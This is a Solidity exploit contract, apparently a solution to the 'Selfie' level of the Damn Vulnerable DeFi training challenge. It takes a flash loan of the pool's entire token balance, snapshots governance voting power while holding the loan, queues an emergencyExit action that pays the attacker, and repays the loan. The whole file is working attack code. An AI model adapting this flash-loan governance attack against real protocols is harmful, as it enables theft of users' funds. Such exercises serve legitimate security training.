// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./ISimpleGovernance.sol";

interface ISelfiePool {
    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external returns (bool);

    function emergencyExit(address receiver) external;
}

contract AttackSelfie {

    address attacker;
    ISelfiePool pool;
    ISimpleGovernance governance;
    DamnValuableTokenSnapshot token;

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(address _pool, address _governance, address _token) {
        pool = ISelfiePool(_pool);
        governance = ISimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(_token);
        attacker = msg.sender;
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", attacker);
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), token.balanceOf(address(pool)), data);
    }

    function onFlashLoan(
        address _from, 
        address _token, 
        uint256 _amount, 
        uint256, 
        bytes calldata data
    ) external returns (bytes32) {
        DamnValuableTokenSnapshot(_token).snapshot();
        governance.queueAction(address(pool), 0, data);
        IERC20(_token).approve(address(pool), _amount);

        return CALLBACK_SUCCESS;
    }
}